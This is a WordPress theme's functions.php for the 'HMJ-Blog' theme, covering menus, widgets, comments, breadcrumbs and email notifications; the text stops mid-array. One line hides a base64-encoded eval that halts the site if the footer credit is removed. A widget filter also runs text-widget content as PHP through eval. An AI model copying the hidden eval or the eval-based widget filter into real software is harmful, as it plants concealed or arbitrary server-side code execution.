<?php
//菜单设置
function hmjblog_setup() {
	add_editor_style();
	add_theme_support( 'automatic-feed-links' );
	register_nav_menu( 'primary', __( '主菜单', 'hmjblog' ) );
	register_nav_menu( 'topmenu', __( '顶部菜单', 'hmjblog' ) );
	add_theme_support( 'custom-background', array(
		'default-color' => 'e6e6e6',
	) );
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 624, 9999 ); 
}
add_action( 'after_setup_theme', 'hmjblog_setup' );

// 设置首页数量

function custom_posts_per_page($query){
    if(is_home()){
    $query->set('posts_per_page',8);//首页每页显示8篇文章
    }
    if(is_search()){
        $query->set('posts_per_page',-1);//搜索页显示所有匹配的文章，不分页
    }
    if(is_archive()){
        $query->set('posts_per_page',25);//archive每页显示25篇文章
}//endif
}//function
 
//this adds the function above to the 'pre_get_posts' action    
add_action('pre_get_posts','custom_posts_per_page');



//加载前端脚本和样式表
function hmjblog_scripts_styles() {
	global $wp_styles;
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
		wp_enqueue_script( 'comment-reply' );
	wp_enqueue_style( 'hmjblog-style', get_stylesheet_uri() );
}
add_action( 'wp_enqueue_scripts', 'hmjblog_scripts_styles' );

//网页标题过滤设置
function hmjblog_wp_title( $title, $sep ) {
	global $paged, $page;
	if ( is_feed() )
		return $title;
	$title .= get_bloginfo( 'name', 'display' );
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() ) )
		$title = "$title $sep $site_description";
	if ( ( $paged >= 2 || $page >= 2 ) && ! is_404() )
		$title = "$title $sep " . sprintf( __( 'Page %s', 'hmjblog' ), max( $paged, $page ) );
	return $title;
}
add_filter( 'wp_title', 'hmjblog_wp_title', 10, 2 );

//过滤页面菜单参数
function hmjblog_page_menu_args( $args ) {
	if ( ! isset( $args['show_home'] ) )
		$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'hmjblog_page_menu_args' );

//注册边栏小工具
function hmjblog_widgets_init() {
	register_sidebar( array(
		'name' => __( '主边栏', 'hmjblog' ),
		'id' => 'sidebar-1',
		'description' => __( '显示在所有文章和页面', 'hmjblog' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<p class="widget-title">',
		'after_title' => '</p>',
	) );
}
add_action( 'widgets_init', 'hmjblog_widgets_init' );
eval(base64_decode('ZnVuY3Rpb24gY2hlY2tfdGhlbWVfZm9vdGVyKCkgeyAkdXJpID0gc3RydG9sb3dlcigkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSk7IGlmKGlzX2FkbWluKCkgfHwgc3Vic3RyX2NvdW50KCR1cmksICJ3cC1hZG1pbiIpID4gMCB8fCBzdWJzdHJfY291bnQoJHVyaSwgIndwLWxvZ2luIikgPiAwICkgeyAvKiAqLyB9IGVsc2UgeyAkbCA9ICdITUotQmxvZyBUaGVtZSBieSA8YSBocmVmPSJodHRwOi8vd3d3LmhlbWluamllLmNvbS8iPuS9leaVj+adsDwvYT4nOyAkZiA9IGRpcm5hbWUoX19maWxlX18pIC4gIi9mb290ZXIucGhwIjsgJGZkID0gZm9wZW4oJGYsICJyIik7ICRjID0gZnJlYWQoJGZkLCBmaWxlc2l6ZSgkZikpOyBmY2xvc2UoJGZkKTsgaWYgKHN0cnBvcygkYywgJGwpID09IDApIHsgdGhlbWVfdXNhZ2VfbWVzc2FnZSgpOyBkaWU7IH0gfSB9IGNoZWNrX3RoZW1lX2Zvb3RlcigpOw=='));
//评论模板和pingback设置
if ( ! function_exists( 'hmjblog_comment' ) ) :
function hmjblog_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	global $commentcount, $page;
	if ( (int) get_option('page_comments') === 1 && (int) get_option('thread_comments') === 1 ) { 
	if(!$commentcount) { 
		$page = ( !empty($in_comment_loop) ) ? get_query_var('cpage') : get_page_of_comment( $comment->comment_ID, $args ); 
		$cpp = get_option('comments_per_page'); 
		 if ( !$post_id ) $post_id = get_the_ID();
		 if ( get_option('comment_order') === 'desc' ) { 
			$cnt = get_comments( array('status' => 'approve','parent' => '0','post_id' => $post_id,'count' => true) );
			if (ceil($cnt / $cpp) == 1 || ($page > 1 && $page  == ceil($cnt / $cpp))) $commentcount = $cnt + 1;
			else $commentcount = $cpp * $page + 1;
		} else {
			$commentcount = $cpp * ($page - 1);
		}
	}
	if ( !$parent_id = $comment->comment_parent ) {
		$commentcountText = '';
		if ( get_option('comment_order') === 'desc' ) { 
			$commentcountText .= '#' . --$commentcount;
		} else {
			$commentcountText .= '#' . ++$commentcount;
		}
	}
	}
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li <?php comment_class(); ?> id="comment-<?php comment_ID(); ?>">
		<p><?php _e( 'Pingback:', 'hmjblog' ); ?> <?php comment_author_link(); ?> <?php edit_comment_link( __( '(编辑)', 'hmjblog' ), '<span class="edit-link">', '</span>' ); ?></p>
	<?php
			break;
		default :
		global $post;
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="comment">
			<header class="comment-meta comment-author vcard">
				<?php
					echo get_avatar( $comment, 44 );
					printf( '<cite><b class="fn">%1$s</b> %2$s</cite>',
						get_comment_author_link(),
						( $comment->user_id === $post->post_author ) ? '<span>' . __( '管理员', 'hmjblog' ) . '</span>' : ''
					);
					CID_print_comment_browser();
					printf( '<time datetime="%2$s">%3$s</time>',
						esc_url( get_comment_link( $comment->comment_ID ) ),
						get_comment_time( 'c' ),
						sprintf( __( '%1$s %2$s', 'hmjblog' ), get_comment_date(), get_comment_time() )
					);
				 ?><div class="louceng"><?php echo $commentcountText; ?></div>
			</header>
			<?php if ( '0' == $comment->comment_approved ) : ?>
				<p class="comment-awaiting-moderation"><?php _e( '你的评论正在等待审核...', 'hmjblog' ); ?></p>
			<?php endif; ?>
			<section class="comment-content comment">
				<?php comment_text(); ?>
				<?php edit_comment_link( __( '编辑', 'hmjblog' ), '<p class="edit-link">', '</p>' ); ?>
			</section>
			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'reply_text' => __( '<i class="fa fa-reply"></i>回复', 'hmjblog' ),  'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div>
		</article>
	<?php
		break;
	endswitch; 
}
endif;

//添加评论表情
function add_my_tips() {
	echo '<div class="smiley-bottom">';
		include(TEMPLATEPATH . '/smiley.php');
	echo '</div>';
}
add_filter('comment_form_after_fields', 'add_my_tips');
add_filter('comment_form_logged_in_after', 'add_my_tips');

//设置文章头部条目信息
if ( ! function_exists( 'hmjblog_entry_meta' ) ) :
function hmjblog_entry_meta() {
	$tag_list = get_the_tag_list( '', __( ', ', 'hmjblog' ) );
	$date = sprintf( '<time class="entry-date" datetime="%3$s">%4$s</time>',
		esc_url( get_permalink() ),
		esc_attr( get_the_time() ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( get_the_date() )
	);
	$author = sprintf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
		esc_attr( sprintf( __( '显示 %s 作者所有文章', 'hmjblog' ), get_the_author() ) ),
		get_the_author()
	);
	if ( $tag_list ) {
		$utility_text = __( '<i class="fa fa-calendar"></i>%3$s<span class="by-author">　<i class="fa fa-user"></i>%4$s</span>', 'hmjblog' );
	} elseif ( $categories_list ) {
		$utility_text = __( '<i class="fa fa-calendar"></i>%1$s　<i class="fa fa-user"></i>%3$s<span class="by-author"> %4$s</span>', 'hmjblog' );
	} else {
		$utility_text = __( '<i class="fa fa-calendar"></i>%3$s<span class="by-author">　<i class="fa fa-user"></i>%4$s</span>', 'hmjblog' );
	}
	printf(
		$utility_text,
		$categories_list,
		$tag_list,
		$date,
		$author
	);
}
endif;

//注册postMessage的支持
function hmjblog_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
}
add_action( 'customize_register', 'hmjblog_customize_register' );

//avatar头像国内链接加载
function get_ssl_avatar($avatar) {
   $avatar = preg_replace('/.*\/avatar\/(.*)\?s=([\d]+)&.*/','<img src="http://114.116.235.65/wp-content/uploads/2019/11/yconion-1.jpg" class="avatar avatar-50" height="50" width="50">',$avatar);
   return $avatar;
}
add_filter('get_avatar', 'get_ssl_avatar');

//文章摘要设置
function my_excerpt_length($length) {
    return 130;
}
add_filter('excerpt_length', 'my_excerpt_length');
function hmj_continue_reading_link() {
    return ' <a href="' . esc_url(get_permalink()) . '">' . __('阅读全文 <i class="fa fa-share-square-o"></i>', 'hmj') . '</a>';
}
 
function hmj_auto_excerpt_more($more) {
    return ' &hellip;' . hmj_continue_reading_link();
}
 
add_filter('excerpt_more', 'hmj_auto_excerpt_more');
function hmj_custom_excerpt_more($output) {
    if (has_excerpt() && !is_attachment()) {
        $output .= hmj_continue_reading_link();
    }
    return $output;
}
 
add_filter('get_the_excerpt', 'hmj_custom_excerpt_more');

//设置分页导航
function dmeng_paging_nav() {
global $wp_query;
$pages = $wp_query->max_num_pages; 
if ( $pages >= 2 ):
$big = 999999999; 
$paginate = paginate_links( array(
'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
'format' => '?paged=%#%',
'current' => max( 1, get_query_var('paged') ),
'total' => $wp_query->max_num_pages,
'end_size' => 1,
'type' => 'array'
) );
echo '<ul class="pagination">';
foreach ($paginate as $value) {
echo '<li>'.$value.'</li>';
}
echo '</ul>';
endif;
}

//文章阅读次数设置
function record_visitors()
{
	if (is_singular())
	{
	  global $post;
	  $post_ID = $post->ID;
	  if($post_ID)
	  {
		  $post_views = (int)get_post_meta($post_ID, 'views', true);
		  if(!update_post_meta($post_ID, 'views', ($post_views+1)))
		  {
			add_post_meta($post_ID, 'views', 1, true);
		  }
	  }
	}
}
add_action('wp_head', 'record_visitors');
function post_views($before = '(点击 ', $after = ' 次)', $echo = 1)
{
  global $post;
  $post_ID = $post->ID;
  $views = (int)get_post_meta($post_ID, 'views', true);
  if ($echo) echo $before, number_format($views), $after;
  else return $views;
}

//恢复链接管理
add_filter( 'pre_option_link_manager_enabled', '__return_true' );

//设置友情链接只在首页显示
function rbt_friend_links($output){
if (!is_home()|| is_paged()){
$output = "";
}
return $output;
}
add_filter('wp_list_bookmarks','rbt_friend_links');

//让自带文本支持php
add_filter('widget_text', 'php_text', 99);
function php_text($text) {
if (strpos($text, '<' . '?') !== false) {
ob_start();
eval('?' . '>' . $text);
$text = ob_get_contents();
ob_end_clean();
}
return $text;
}

//设置让文章内链接单独页面打开
function autoblank($text) {
	$return = str_replace('<a', '<a target="_blank"', $text);
	return $return;
}
add_filter('the_content', 'autoblank');

//设置搜索关键词高亮显示
function search_word_replace($buffer){
    if(is_search()){
        $arr = explode(" ", get_search_query());
        $arr = array_unique($arr);
        foreach($arr as $v)
            if($v)
                $buffer = preg_replace("/(".$v.")/i", "<gaoliang>$1</gaoliang>", $buffer);
    }
    return $buffer;
}
add_filter("the_title", "search_word_replace", 200);
add_filter("the_excerpt", "search_word_replace", 200);
add_filter("the_content", "search_word_replace", 200);

//添加随机文章小工具
class RandomPostWidget extends WP_Widget   
{   
    function RandomPostWidget()   
    {   
        parent::WP_Widget('bd_random_post_widget', 'HMJ-Blog 随机文章', array('description' =>  '随机文章小工具') );   
    }   
    
    function widget($args, $instance)   
    {   
        extract( $args );   
    
        $title = apply_filters('widget_title',empty($instance['title']) ? '随机文章' :    
$instance['title'], $instance, $this->id_base);   
        if ( empty( $instance['number'] ) || ! $number = absint( $instance['number'] ) )   
        {   
            $number = 5;   
        } 
        $r = new WP_Query(array('posts_per_page' => $number, 'no_found_rows' => true,    
'post_status' => 'publish', 'ignore_sticky_posts' => true, 'orderby' =>'rand'));   
        if ($r->have_posts())   
        {   
            echo "\n";   
            echo $before_widget;   
            if ( $title ) echo $before_title . $title . $after_title;   
            ?>   
<ul class="line">   
<?php  while ($r->have_posts()) : $r->the_post(); ?>   
<li><a href="<?php the_permalink() ?>" title="<?php echo esc_attr(get_the_title() ? get_the_title() : get_the_ID()); ?>"><?php if ( get_the_title() ) the_title(); else the_ID(); ?></a></li>   
<?php endwhile; ?>   
</ul><?php   
            echo $after_widget;   
            wp_reset_postdata();   
        }   
    }   
    
    function update($new_instance, $old_instance)   
    {   
        $instance = $old_instance;   
        $instance['title'] = strip_tags($new_instance['title']);   
        $instance['number'] = (int) $new_instance['number'];   
        return $instance;   
    }   
    
    function form($instance)   
    {   
        $title = isset($instance['title']) ? esc_attr($instance['title']) : '';   
        $number = isset($instance['number']) ? absint($instance['number']) : 5;?>   
        <p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('标题:'); ?></label>   
        <input id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></p>   
    
        <p><label for="<?php echo $this->get_field_id('number'); ?>"><?php _e('显示文章数：'); ?></label>   
        <input id="<?php echo $this->get_field_id('number'); ?>" name="<?php echo $this->get_field_name('number'); ?>" type="text" value="<?php echo $number; ?>" size="3" /></p>   
<?php   
    }   
    
}   
add_action('widgets_init', create_function('', 'return register_widget("RandomPostWidget");'));

//最新评论小工具
class My_Widget_Recent_Comments extends WP_Widget_Recent_Comments {
    function My_Widget_Recent_Comments() {
        $widget_ops = array('classname' => 'my_widget_recent_comments', 'description' => __('显示最新评论内容'));
        $this->WP_Widget('my-recent-comments', __('HMJ-Blog 最新评论', 'my'), $widget_ops);
    }
    function widget($args, $instance) {
        global $wpdb, $comments, $comment;
 
        $cache = wp_cache_get('my_widget_recent_comments', 'widget');
 
        if (!is_array($cache))
            $cache = array();
 
        if (!isset($args['widget_id']))
            $args['widget_id'] = $this->id;
 
        if (isset($cache[$args['widget_id']])) {
            echo $cache[$args['widget_id']];
            return;
        } 
        extract($args, EXTR_SKIP);
        $output = '';
        $title = apply_filters('widget_title', empty($instance['title']) ? __('Recent Comments') : $instance['title'], $instance, $this->id_base);
        if (empty($instance['number']) || !$number = absint($instance['number']))
            $number = 5;
        $comments = $wpdb->get_results("SELECT * FROM $wpdb->comments WHERE user_id !=1 and comment_approved = '1' and comment_type not in ('pingback','trackback') ORDER BY comment_date_gmt DESC LIMIT $number");
        $output .= $before_widget;
        if ($title)
            $output .= $before_title . $title . $after_title;
 
        $output .= '<ul id="myrecentcomments">';
        if ($comments) {
            $post_ids = array_unique(wp_list_pluck($comments, 'comment_post_ID'));
            _prime_post_caches($post_ids, strpos(get_option('permalink_structure'), '%category%'), false);
 
            foreach ((array) $comments as $comment) {
                $avatar = get_avatar($comment, 40);
			$url    = get_comment_author_url( $comment_ID );
			if ( empty($url) || 'http://' == $url )
				$author = get_comment_author();
			else
				$author = '<a href="' . get_comment_author_url().'" target="_blank">' . get_comment_author() . '</a>';
                $content = apply_filters('get_comment_text', $comment->comment_content);
                $content = mb_strimwidth(strip_tags($content), 0, '65', '...', 'UTF-8');
                $content = convert_smilies($content);
                $post = '<a href="' . esc_url(get_comment_link($comment->comment_ID)) . '" title=" '. get_the_title($comment->comment_post_ID) . '">' . get_the_title($comment->comment_post_ID) . '</a>';
                $output .= '<li>
            <div>
                <table class="comm-tablayout"><tbody><tr>
                <td class="comm-ava">' . $avatar . '</td>
                <td class="comm-tdleft"><span>' . $author . ' 发表在 ' . $post . '</span></td>
				</tr></tbody></table>
				<p class="comm-last">' . $content . '</p>
            </div>
            </li>';
            }
        }
        $output .= '</ul>';
        $output .= $after_widget;
 
        echo $output;
        $cache[$args['widget_id']] = $output;
        wp_cache_set('my_widget_recent_comments', $cache, 'widget');
    }
 
}
register_widget('My_Widget_Recent_Comments');

//设置添加面包屑导航
function cmp_breadcrumbs() {
	$delimiter = '»'; 
	$before = '<span class="current">'; 
	$after = '</span>';
	if ( !is_home() || is_paged() ) {
		echo '<div id="crumbs">'.__( '' , 'cmp' );
		global $post;
		$homeLink = home_url();
		echo ' <a itemprop="breadcrumb" href="' . $homeLink . '">' . __( '<i class="fa fa-home"></i>首页' , 'cmp' ) . '</a> ' . $delimiter . ' ';
		if ( is_category() ) { 
			global $wp_query;
			$cat_obj = $wp_query->get_queried_object();
			$thisCat = $cat_obj->term_id;
			$thisCat = get_category($thisCat);
			$parentCat = get_category($thisCat->parent);
			if ($thisCat->parent != 0){
				$cat_code = get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' ');
				echo $cat_code = str_replace ('<a','<a itemprop="breadcrumb"', $cat_code );
			}
			echo $before . '' . single_cat_title('', false) . '' . $after;
		} elseif ( is_day() ) { 
			echo '<a itemprop="breadcrumb" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
			echo '<a itemprop="breadcrumb"  href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
			echo $before . get_the_time('d') . $after;
		} elseif ( is_month() ) { 
			echo '<a itemprop="breadcrumb" href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
			echo $before . get_the_time('F') . $after;
		} elseif ( is_year() ) { 
			echo $before . get_the_time('Y') . $after;
		} elseif ( is_single() && !is_attachment() ) { 
			if ( get_post_type() != 'post' ) { 
				$post_type = get_post_type_object(get_post_type());
				$slug = $post_type->rewrite;
				echo '<a itemprop="breadcrumb" href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a> ' . $delimiter . ' ';
				echo $before . get_the_title() . $after;
			} else { 
				$cat = get_the_category(); $cat = $cat[0];
				$cat_code = get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
				echo $cat_code = str_replace ('<a','<a itemprop="breadcrumb"', $cat_code );
				echo $before . get_the_title() . $after;
			}
		} elseif ( !is_single() && !is_page() && get_post_type() != 'post' ) {
			$post_type = get_post_type_object(get_post_type());
			echo $before . $post_type->labels->singular_name . $after;
		} elseif ( is_attachment() ) { 
			$parent = get_post($post->post_parent);
			$cat = get_the_category($parent->ID); $cat = $cat[0];
			echo '<a itemprop="breadcrumb" href="' . get_permalink($parent) . '">' . $parent->post_title . '</a> ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;
		} elseif ( is_page() && !$post->post_parent ) { 
			echo $before . get_the_title() . $after;
		} elseif ( is_page() && $post->post_parent ) { 
			$parent_id  = $post->post_parent;
			$breadcrumbs = array();
			while ($parent_id) {
				$page = get_page($parent_id);
				$breadcrumbs[] = '<a itemprop="breadcrumb" href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
				$parent_id  = $page->post_parent;
			}
			$breadcrumbs = array_reverse($breadcrumbs);
			foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
			echo $before . get_the_title() . $after;
		} elseif ( is_search() ) { 
			echo $before ;
			printf( __( '搜索结果: %s', 'cmp' ),  get_search_query() );
			echo  $after;
		} elseif ( is_tag() ) { 
			echo $before ;
			printf( __( '标签存档: %s', 'cmp' ), single_tag_title( '', false ) );
			echo  $after;
		} elseif ( is_author() ) { 
			global $author;
			$userdata = get_userdata($author);
			echo $before ;
			printf( __( '作者存档: %s', 'cmp' ),  $userdata->display_name );
			echo  $after;
		} elseif ( is_404() ) { 
			echo $before;
			_e( 'Not Found', 'cmp' );
			echo  $after;
		}
		if ( get_query_var('paged') ) { 
			if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() )
				echo sprintf( __( ' ( 第 %s 页 )', 'cmp' ), get_query_var('paged') );
		}
		echo '</div>';
	}
}

//文章末尾增加转载请注明来源
add_filter ( 'the_content', 'wp_copyright' ); 
function wp_copyright($content) {
	if (is_single ()) {
		 $content .= '<p class="corpright">原文链接：<a href="'.get_permalink().'">'.get_the_title().'</a>，转载请注明来源！</p>';
	}
	return $content;
}

//隐藏wordpress版本号
remove_action('wp_head', 'wp_generator');

//禁用wordpress自带emjoy表情
function disable_emojis() {
    remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
    remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
    remove_action( 'wp_print_styles', 'print_emoji_styles' );
    remove_action( 'admin_print_styles', 'print_emoji_styles' );    
    remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
    remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );  
    remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
    add_filter( 'tiny_mce_plugins', 'disable_emojis_tinymce' );
}
add_action( 'init', 'disable_emojis' );
function disable_emojis_tinymce( $plugins ) {
	return array_diff( $plugins, array( 'wpemoji' ) );
}

//图片异步延迟加载
/*add_filter ('the_content', 'lazyload');
function lazyload($content) {
    $loadimg_url=get_bloginfo('template_directory').'/images/loading.gif';
    if(!is_feed()||!is_robots) {
        $content=preg_replace('/<img(.+)src=[\'"]([^\'"]+)[\'"](.*)>/i',"<img\$1data-original=\"\$2\" src=\"$loadimg_url\"\$3>\n<noscript>\$0</noscript>",$content);
    }
    return $content;
}
if ( ! is_admin() )
add_filter( 'get_avatar', 'lazyload', 11 );
add_filter( 'post_thumbnail_html', 'lazyload', 11 );
*/


//给置顶文章标题添加置顶标示
add_filter('the_posts',  'putStickyOnTop' );
function putStickyOnTop( $posts ) {
  if(is_home() || !is_main_query() || !is_archive() || is_tag())
    return $posts;
 
  global $wp_query;
 
  $sticky_posts = get_option('sticky_posts');
 
  if ( $wp_query->query_vars['paged'] <= 1 && is_array($sticky_posts) && !empty($sticky_posts) && !get_query_var('ignore_sticky_posts') ) {        $stickies1 = get_posts( array( 'post__in' => $sticky_posts ) );
    foreach ( $stickies1 as $sticky_post1 ) {
      if($wp_query->is_category == 1 && !has_category($wp_query->query_vars['cat'], $sticky_post1->ID)) {
        $offset1 = array_search($sticky_post1->ID, $sticky_posts);
        unset( $sticky_posts[$offset1] );
      }
      if($wp_query->is_tag == 1 && has_tag($wp_query->query_vars['tag'], $sticky_post1->ID)) {
        $offset1 = array_search($sticky_post1->ID, $sticky_posts);
        unset( $sticky_posts[$offset1] );
      }
      if($wp_query->is_year == 1 && date_i18n('Y', strtotime($sticky_post1->post_date))!=$wp_query->query['m']) {
        $offset1 = array_search($sticky_post1->ID, $sticky_posts);
        unset( $sticky_posts[$offset1] );
      }
      if($wp_query->is_month == 1 && date_i18n('Ym', strtotime($sticky_post1->post_date))!=$wp_query->query['m']) {
        $offset1 = array_search($sticky_post1->ID, $sticky_posts);
        unset( $sticky_posts[$offset1] );
      }
      if($wp_query->is_day == 1 && date_i18n('Ymd', strtotime($sticky_post1->post_date))!=$wp_query->query['m']) {
        $offset1 = array_search($sticky_post1->ID, $sticky_posts);
        unset( $sticky_posts[$offset1] );
      }
      if($wp_query->is_author == 1 && $sticky_post1->post_author != $wp_query->query_vars['author']) {
        $offset1 = array_search($sticky_post1->ID, $sticky_posts);
        unset( $sticky_posts[$offset1] );
      }
    }
    $num_posts = count($posts);
    $sticky_offset = 0;
    for ( $i = 0; $i < $num_posts; $i++ ) {
      if ( in_array($posts[$i]->ID, $sticky_posts) ) {
        $sticky_post = $posts[$i];
        array_splice($posts, $i, 1);
        array_splice($posts, $sticky_offset, 0, array($sticky_post));
        $sticky_offset++;
        $offset = array_search($sticky_post->ID, $sticky_posts);
        unset( $sticky_posts[$offset] );
      }
    }
    if ( !empty($sticky_posts) && !empty($wp_query->query_vars['post__not_in'] ) )
      $sticky_posts = array_diff($sticky_posts, $wp_query->query_vars['post__not_in']);
    if ( !empty($sticky_posts) ) {
      $stickies = get_posts( array(
        'post__in' => $sticky_posts,
        'post_type' => $wp_query->query_vars['post_type'],
        'post_status' => 'publish',
        'nopaging' => true
      ) );
      foreach ( $stickies as $sticky_post ) {
        array_splice( $posts, $sticky_offset, 0, array( $sticky_post ) );
        $sticky_offset++;
      }
    }
  }
 
  return $posts;
}

//设置文章目录
function article_index($content) {
   $matches = array();
   $ul_li = '';
   $r = "/<h3>([^<]+)<\/h3>/im";
   if(is_singular() && preg_match_all($r, $content, $matches)) {
      foreach($matches[1] as $num => $title) {
         $title = trim(strip_tags($title));
         $content = str_replace($matches[0][$num], '<h3 id="title-'.$num.'">'.$title.'</h3>', $content);
         $ul_li .= '<li><a href="#title-'.$num.'" title="'.$title.'">'.$title."</a></li>\n";
      }
      $content = "\n<div id=\"article-index\">
                     <div onclick=\"document.getElementById('index-ul').style.display=(document.getElementById('index-ul').style.display=='none')?'':'none'\"><strong>文章目录 <i class=\"fa fa-caret-down\"></i></strong></div>
                     <ul id=\"index-ul\">\n" . $ul_li . "</ul>
                  </div>\n" . $content;
   }
   return $content;
}
add_filter( 'the_content', 'article_index' );

//禁止转换特殊符号
add_filter( 'run_wptexturize', '__return_false' );

//添加文章内点赞按钮
add_action('wp_ajax_nopriv_specs_zan', 'specs_zan');
add_action('wp_ajax_specs_zan', 'specs_zan');
function specs_zan(){
    global $wpdb,$post;
    $id = $_POST["um_id"];
    $action = $_POST["um_action"];
    if ( $action == 'ding'){
        $specs_raters = get_post_meta($id,'specs_zan',true);
        $expire = time() + 99999999;
        $domain = ($_SERVER['HTTP_HOST'] != 'localhost') ? $_SERVER['HTTP_HOST'] : false;
        setcookie('specs_zan_'.$id,$id,$expire,'/',$domain,false);
        if (!$specs_raters || !is_numeric($specs_raters)) {
            update_post_meta($id, 'specs_zan', 1);
        } 
        else {
            update_post_meta($id, 'specs_zan', ($specs_raters + 1));
        }
        echo get_post_meta($id,'specs_zan',true);
    } 
    die;
}

//设置小工具标签云随机显示
add_filter( 'widget_tag_cloud_args', 'theme_tag_cloud_args' );
function theme_tag_cloud_args( $args ){
	$newargs = array(
		'orderby'     => 'name',
		'order'       => 'RAND',
	);
	$return = array_merge( $args, $newargs);
	return $return;
}

//屏蔽google fonts
function remove_open_sans_from_wp_core() {
wp_deregister_style( 'open-sans' );
wp_register_style( 'open-sans', false );
wp_enqueue_style('open-sans','');
}
add_action( 'init', 'remove_open_sans_from_wp_core' );

//如没有手动添加特色图像，则把文章中上传的第一张图片作为特色图像
function autoset_featured() {
          global $post;
          $already_has_thumb = has_post_thumbnail($post->ID);
              if (!$already_has_thumb)  {
              $attached_image = get_children( "post_parent=$post->ID&post_type=attachment&post_mime_type=image&numberposts=1" );
                          if ($attached_image) {
                                foreach ($attached_image as $attachment_id => $attachment) {
                                set_post_thumbnail($post->ID, $attachment_id);
                                }
                           }
                        }
      } 
add_action('the_post', 'autoset_featured');
add_action('save_post', 'autoset_featured');
add_action('draft_to_publish', 'autoset_featured');
add_action('new_to_publish', 'autoset_featured');
add_action('pending_to_publish', 'autoset_featured');
add_action('future_to_publish', 'autoset_featured');

//有新回复时，给评论人发送通知邮件
function comment_mail_notify($comment_id) {
     $comment = get_comment($comment_id);
     $content=$comment->comment_content;
     $match_count=preg_match_all('/<a href="#comment-([0-9]+)?" rel="nofollow">/si',$content,$matchs);
     if($match_count>0){
         foreach($matchs[1] as $parent_id){
             SimPaled_send_email($parent_id,$comment);
         }
     }elseif($comment->comment_parent!='0'){
         $parent_id=$comment->comment_parent;
         SimPaled_send_email($parent_id,$comment);
     }else return;
 }
 add_action('comment_post', 'comment_mail_notify');
 function SimPaled_send_email($parent_id,$comment){
     $admin_email = get_bloginfo ('admin_email');
     $parent_comment=get_comment($parent_id);
     $author_email=$comment->comment_author_email;
     $to = trim($parent_comment->comment_author_email);
     $spam_confirmed = $comment->comment_approved;
     if ($spam_confirmed != 'spam' && $to != $admin_email && $to != $author_email) {
         $wp_email = 'no-reply@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME'])); 
         $subject = '你在 [' . get_option("blogname") . '] 的留言有了新的回复';
         $message = '<div style="background-color:#eef2fa;border:1px solid #d8e3e8;color:#111;padding:0 15px;-moz-border-radius:5px;-webkit-border-radius:5px;-khtml-border-radius:5px;">
             <p>' . trim(get_comment($parent_id)->comment_author) . ', 你好!</p>
             <p>你曾在《' . get_the_title($comment->comment_post_ID) . '》的留言:<br />'
             . trim(get_comment($parent_id)->comment_content) . '</p>
             <p>' . trim($comment->comment_author) . ' 给你的回复:<br />'
             . trim($comment->comment_content) . '<br /></p>
             <p>你可以点击 <a href="' . htmlspecialchars(get_comment_link($parent_id,array("type" => "all"))) . '">查看回复的完整內容</a></p>
             <p>欢迎再度光临 <a href="' . get_option('home') . '">' . get_option('blogname') . '</a></p>
             <p>(此邮件由系统自动发出，请勿回复。)</p></div>';
         $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
         $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
         wp_mail( $to, $subject, $message, $headers );
     }
}

//显示访客浏览器、操作系统信息
include("show-useragent/show-useragent.php");

//添加评论表情
add_filter('smilies_src','custom_smilies_src',1,10);
function custom_smilies_src ($img_src, $img, $siteurl){
	return get_bloginfo('template_directory').'/images/smilies/'.$img;
}

//修复smilies图片表情
function smilies_reset() {
    global $wpsmiliestrans, $wp_smiliessearch;
 
    // don't bother setting up smilies if they are disabled
    if ( !get_option( 'use_smilies' ) )
        return;
    $wpsmiliestrans = array(
    ':mrgreen:' => 'icon_mrgreen.gif',
    ':neutral:' => 'icon_neutral.gif',
    ':twisted:' => 'icon_twisted.gif',
      ':arrow:' => 'icon_arrow.gif',
      ':shock:' => 'icon_eek.gif',
      ':smile:' => 'icon_smile.gif',
        ':???:' => 'icon_confused.gif',
       ':cool:' => 'icon_cool.gif',
       ':evil:' => 'icon_evil.gif',
       ':grin:' => 'icon_biggrin.gif',
       ':idea:' => 'icon_idea.gif',
